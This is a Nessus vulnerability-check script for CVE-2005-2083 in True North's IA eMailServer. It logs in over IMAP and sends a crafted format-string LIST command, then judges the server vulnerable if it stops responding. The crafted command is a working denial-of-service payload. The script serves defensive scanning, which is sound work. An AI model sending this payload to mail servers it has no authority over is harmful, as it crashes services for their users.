#
# (C) Tenable Network Security
#


if (description) {
  script_id(18570);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2005-2083");
  script_bugtraq_id(14065);
  script_xref(name:"OSVDB", value:"17609");

  name["english"] = "IA eMailServer Remote Format String Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote mail server is affected by a format string vulnerability. 

Description :

The remote host is running True North Software's IA eMailServer, a
messaging system for Windows. 

The remote version of IA eMailServer suffers from a format string
vulnerability leading to a denial of service that can be exploited by
an authenticated user when sending a specially-crafted IMAP LIST
command. 

Note that, given the nature of format string vulnerabilities, this
issue may also result in remote code execution within the context of
the affected application, although this is just conjecture at this
point. 

See also : 

http://lists.grok.org.uk/pipermail/full-disclosure/2005-June/034727.html

Solution : 

Upgrade to IA eMailServer 5.3.4 Build 2019 or greater.

Risk factor : 

Low / CVSS Base Score : 1 
(AV:R/AC:L/Au:R/C:N/A:P/I:N/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for remote format string vulnerability in IA eMailServer";
  script_summary(english:summary["english"]);
 
  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  family["english"] = "Denial of Service";
  script_family(english:family["english"]);

  script_dependencies("imap_overflow.nasl");
  script_require_keys("imap/login", "imap/password");
  script_exclude_keys("imap/false_imap", "imap/overflow");
  script_require_ports("Services/imap", 143);

  exit(0);
}

include("global_settings.inc");
include("imap_func.inc");


port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port)) exit(0);
if (get_kb_item("imap/false_imap") || get_kb_item("imap/overflow")) exit(0);
user = get_kb_item("imap/login");
pass = get_kb_item("imap/password");
if (!user || !pass) {
  if (log_verbosity > 1) debug_print("imap/login and/or imap/password are empty; skipped!", level:0);
  exit(1);
}



# Establish a connection.
soc = open_sock_tcp(port);
if (soc) {
  tag = 0;
  s = recv_line(socket:soc, length:1024);

  # If it's IA eMailServer...
  if (strlen(s) && "True North Software IMAP4rev1" >< s) {
    # Try to log in.
    ++tag;
    c = string("a", string(tag), " LOGIN ", user, " ", pass);
    send(socket:soc, data:string(c, "\r\n"));
    while (s = recv_line(socket:soc, length:1024)) {
      s = chomp(s);
      m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
      if (!isnull(m)) {
        resp = m[1];
        break;
      }
      resp = "";
    }
    if (resp && resp =~ "NO") {
      if (log_verbosity > 1) debug_print("can't login with supplied imap credentials; skipped!", level:0);
    }
    else if (resp && resp =~ "OK") {
      # Try to exploit the flaw.
      ++tag;
      c = string("a", string(tag), " LIST 1 \\%x");
      send(socket:soc, data:string(c, "\r\n"));
      while (s = recv_line(socket:soc, length:1024)) {
        s = chomp(s);
        m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
        if (!isnull(m)) {
          resp = m[1];
          break;
        }
        resp = "";
      }

      # If we didn't get a response back...
      if (!strlen(s)) {
        sleep(1);
        # Try to reestablish a connection and read the banner.
        soc2 = open_sock_tcp(port);
        if (soc2) s2 = recv_line(socket:soc2, length:1024);

        # If we couldn't establish the connection or read the banner,
        # there's a problem.
        if (!soc2 || !strlen(s2)) {
          security_note(port);
          exit(0);
        }
        close(soc2);
      }
    }
  }

  # Be nice and logout.
  ++tag;
  c = string("a", string(tag), " LOGOUT");
  send(socket:soc, data:string(c, "\r\n"));
  close(soc);
}
